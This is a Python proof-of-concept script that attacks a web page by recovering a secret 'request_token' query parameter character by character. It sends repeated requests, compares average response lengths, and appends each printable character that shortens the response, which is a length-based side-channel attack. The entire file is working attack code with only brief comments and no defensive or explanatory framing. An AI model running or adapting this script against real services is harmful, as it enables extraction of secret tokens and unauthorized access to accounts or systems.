import requests
import string
import time

# Replace with the actual URL of the target page
url = 'https://malbot.net/poc'
# The name of the query parameter to manipulate
param_name = 'request_token'

# All printable ASCII characters to try as possible token characters
possible_chars = string.printable

# Initialize the guessed token as an empty string
guessed_token = ''

# Threshold to consider a decrease in response length significant
threshold = 0.5

def get_response_length(guess, num_requests=3):
    """
    Sends multiple requests with the given guess and returns the average response length.

    Args:
        guess (str): The current guessed token.
        num_requests (int): Number of requests to send for averaging.

    Returns:
        float: The average length of the response content.
    """
    params = {param_name: guess}
    lengths = []
    for _ in range(num_requests):
        try:
            response = requests.get(url, params=params)
            response.raise_for_status()
            lengths.append(len(response.content))
        except requests.RequestException as e:
            print(f"Request failed: {e}")
            continue
        time.sleep(0.05)  # Small delay between requests
    if lengths:
        avg_length = sum(lengths) / len(lengths)
        return avg_length
    else:
        return float('inf')

while True:
    found_char = False
    # Get the baseline response length without any new character
    baseline_length = get_response_length(guessed_token)
    print(f"Current guessed_token: '{guessed_token}', baseline length: {baseline_length}")

    for c in possible_chars:
        # Append the character to the current guess
        current_guess = guessed_token + c
        # Get the average response length for the current guess
        response_length = get_response_length(current_guess)
        print(f"Trying '{current_guess}': response length = {response_length}")

        # If the response length decreases significantly, we've guessed the correct character
        if response_length < baseline_length - threshold:
            print(f"Found character: '{c}'")
            guessed_token += c
            found_char = True
            break  # Proceed to guess the next character

        time.sleep(0.1)  # Delay to avoid overwhelming the server

    if not found_char:
        print("Could not find the next character. Exiting.")
        break  # Exit if no character causes a significant decrease in response length

print(f"Guessed token: '{guessed_token}'")
